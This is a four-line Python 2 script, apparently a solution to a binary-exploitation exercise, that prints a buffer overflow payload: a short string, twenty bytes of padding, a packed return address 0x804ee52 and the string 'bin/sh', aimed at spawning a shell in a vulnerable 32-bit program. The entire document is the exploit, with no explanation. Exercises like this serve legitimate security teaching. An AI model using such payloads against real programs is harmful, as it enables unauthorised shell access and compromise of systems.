from shellcode import shellcode
from struct import pack

print "sh" + "a"*20 + pack("<I", 0x804ee52) +"bin/sh"
